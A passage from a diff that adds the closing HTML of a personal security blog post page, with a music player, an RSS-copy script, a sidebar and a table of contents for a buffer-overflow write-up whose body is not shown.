+<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/DreamLover/starnight.png'><img src="/images/DreamLover/starnight.png" width=700/>
+</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/09/08/2026-9-8-WarFTP-BOF/">[Learning] CVE-2007-1567: WarFTP 1.65 - 'USER' Remote Buffer Overflow Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="utterances-sel"></button></div><div id="utterances-container"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/" width="200" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://x.com/iss4c_f0ng/"><i class="fab fa-twitter" alt="X"></i></a></div><div id="rss-feed"><a class="social" id="rss-copy-button" href="javascript:void(0)" title="Copy RSS link to clipboard"><span>RSS</span></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしい) music!</p><p style="text-align:center; position: relative"><img class="music-anime" id="anime-img" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div style="text-align:center"><button class="music-btn" id="music-prev">⏮</button><button class="music-btn" id="music-toggle">▶ Play Music</button><button class="music-btn" id="music-next">⏭</button></div><div style="margin-top:5px"><span id="music-index"></span></div><hr style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
+  var playlist = [
+    "/mp3/music/music_1.mp3",
+    "/mp3/music/sugar_story.mp3",
+    "/mp3/music/story_music_box.mp3",
+    "/mp3/music/last_page.mp3",
+    "/mp3/music/sunset_memory.mp3",
+    "/mp3/music/welcome_home.mp3",
+    "/mp3/music/canon.mp3",
+    "/mp3/music/arigadou.mp3",
+  ];
+
+  var current = 0;
+  const audio = document.getElementById("bg-music");
+  const btn = document.getElementById("music-toggle");
+  const prevBtn = document.getElementById("music-prev");
+  const nextBtn = document.getElementById("music-next");
+  const indexDisplay = document.getElementById("music-index");
+
+  function updateDisplay() {
+    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
+  }
+
+  updateDisplay();
+
+  btn.addEventListener("click", function () {
+    if (audio.paused) {
+      audio.src = playlist[current];
+      audio.play();
+      btn.innerText = "⏸ Pause Music";
+    } else {
+      audio.pause();
+      btn.innerText = "▶ Play Music";
+    }
+  });
+
+  nextBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current = (current + 1) % playlist.length;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  prevBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current--;
+
+    if (current < 0)
+      current = playlist.length - 1;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  audio.addEventListener("ended", function() {
+    current = (current + 1) % playlist.length;
+    audio.src = playlist[current];
+    audio.play();
+    updateDisplay();
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const animeImg = document.getElementById("anime-img");
+
+  animeImg.addEventListener("click", function() {
+    
+    const tip = document.createElement("div");
+    tip.innerText = "?";
+    tip.style.position = "absolute";
+    tip.style.top = "-50px";
+    tip.style.left = "50%";
+    tip.style.transform = "translateX(-50%)";
+    tip.style.backgroundColor = "#fff";
+    tip.style.color = "rgb(16, 174, 11)";
+    tip.style.padding = "2px 6px";
+    tip.style.border = "1px solid #ccc";
+    tip.style.borderRadius = "8px";
+    tip.style.boxShadow = "0 3px 6px rgba(0,0,0,0.2)";
+    tip.style.fontSize = "50px";
+    tip.style.fontWeight = "bold";
+    tip.style.zIndex = "1000";
+    tip.style.opacity = "1";
+    tip.style.transition = "opacity 1s, top 1s";
+    
+    animeImg.parentElement.appendChild(tip);
+
+    setTimeout(() => {
+      tip.style.opacity = "0";
+      tip.style.top = "-60px";
+      setTimeout(() => tip.remove(), 1000);
+    }, 2000);
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const rssBtn = document.getElementById("rss-copy-button");
+
+  rssBtn.addEventListener("click", async () => {
+    const rssUrl = window.location.origin + "/atom.xml";
+    try {
+      await navigator.clipboard.writeText(rssUrl);
+
+      const tip = document.createElement("div");
+      tip.innerText = "RSS link copied!";
+      tip.style.position = "absolute";
+      tip.style.top = "-30px";
+      tip.style.left = "50%";
+      tip.style.transform = "translateX(-50%)";
+      tip.style.backgroundColor = "#0d0d0d";
+      tip.style.color = "#00fff7";
+      tip.style.border = "1px solid #ff00ff";
+      tip.style.boxShadow = "0 0 8px #ff00ff, 0 0 16px #00fff7";
+      tip.style.padding = "2px 6px";
+      tip.style.borderRadius = "8px";
+      tip.style.fontSize = "14px";
+      tip.style.fontWeight = "bold";
+      tip.style.zIndex = "1000";
+      tip.style.opacity = "1";
+      tip.style.transition = "opacity 1s, top 1s";
+
+      rssBtn.style.position = "relative";
+      rssBtn.appendChild(tip);
+
+      setTimeout(() => {
+        tip.style.opacity = "0";
+        tip.style.top = "-40px";
+        setTimeout(() => tip.remove(), 1000);
+      }, 2000);
+
+    } catch (err) {
+      console.error("Failed to copy: ", err);
+    }
+  });
+});
+</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Buffer-Overflow"><span class="toc-number">2.</span> <span class="toc-text">Buffer Overflow</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">3.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">4.</span> <span class="toc-text">THANKS FOR READING</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/custom.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>
